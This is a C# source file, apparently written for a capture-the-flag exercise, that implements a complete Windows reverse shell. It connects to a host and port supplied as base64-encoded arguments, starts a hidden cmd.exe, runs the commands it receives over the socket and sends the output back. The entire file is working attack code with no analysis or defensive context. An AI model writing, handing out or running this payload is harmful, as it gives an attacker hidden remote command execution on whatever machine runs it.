using System;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;

namespace ReverseShellCTF
{
    class Program
    {
        static StreamWriter writer;

        static void Main(string[] args)
        {
            try
            {
                if (args.Length != 2)
                {
                    return;
                }

                string ip = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
                int port = int.Parse(Encoding.UTF8.GetString(Convert.FromBase64String(args[1])));

                using (TcpClient client = new TcpClient(ip, port))
                using (NetworkStream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    writer = new StreamWriter(stream) { AutoFlush = true };

                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;

                    process.OutputDataReceived += (sender, e) => {
                        if (!string.IsNullOrEmpty(e.Data))
                        {
                            try { writer.WriteLine(e.Data); } catch { }
                        }
                    };

                    process.ErrorDataReceived += (sender, e) => {
                        if (!string.IsNullOrEmpty(e.Data))
                        {
                            try { writer.WriteLine(e.Data); } catch { }
                        }
                    };

                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    while (true)
                    {
                        string cmd = reader.ReadLine();
                        if (cmd == null) break;

                        process.StandardInput.WriteLine(cmd);
                        process.StandardInput.Flush();
                    }

                    process.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText("C:\\Windows\\Temp\\rev_error.txt", ex.ToString());
            }
        }
    }
}
